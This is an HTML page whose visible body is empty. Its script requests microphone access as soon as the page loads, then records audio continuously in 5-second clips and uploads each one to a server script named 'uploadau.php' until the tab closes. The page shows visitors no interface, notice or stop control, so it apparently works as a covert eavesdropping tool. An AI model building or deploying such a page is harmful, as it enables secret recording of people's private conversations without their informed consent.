<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

</head>
<body>
   

    <script>
        let mediaRecorder;
let audioChunks = [];
let stream;
let isRecording = false;
let intervalId;

// Function to start continuous recording
async function startRecording() {
    try {
        // Request microphone access
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });

        // Start a new recording every 5 seconds
        intervalId = setInterval(() => {
            if (!isRecording) {
                startNewRecording();
            }
        }, 5000); // Trigger new recording every 5 seconds

    } catch (error) {
        console.error('Permission denied or error:', error);
    }
}

// Function to handle starting a new recording
function startNewRecording() {
    audioChunks = []; // Clear previous audio chunks
    isRecording = true;

    mediaRecorder = new MediaRecorder(stream);

    // Collect audio data as it's being recorded
    mediaRecorder.ondataavailable = event => {
        audioChunks.push(event.data);
    };

    mediaRecorder.onstop = () => {
        // When the recording stops, create a Blob and send it to the server
        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
        sendAudioToServer(audioBlob);
        isRecording = false; // Set isRecording to false to start the next recording after 5 seconds
    };

    // Start recording
    mediaRecorder.start();
    console.log("Recording started...");
    
    // Stop the recording after 5 seconds
    setTimeout(() => {
        if (isRecording) {
            mediaRecorder.stop();
            console.log("Recording stopped after 5 seconds");
        }
    }, 5000);
}

// Function to send the audio data to the server
function sendAudioToServer(audioBlob) {
    const formData = new FormData();
    formData.append('audio', audioBlob, 'recorded_audio.wav');

    fetch('uploadau.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(result => {
        console.log('Audio uploaded successfully:', result);
    })
    .catch(error => {
        console.error('Error uploading audio:', error);
    });
}

// Start the recording process when the page loads
window.onload = () => {
    startRecording();
};

// Stop the interval and stop recording if the user navigates away or closes the tab
window.onbeforeunload = () => {
    clearInterval(intervalId);
    if (mediaRecorder.state === "recording") {
        mediaRecorder.stop();
        console.log("Recording stopped before unload");
    }
};

    </script>
</body>
</html>
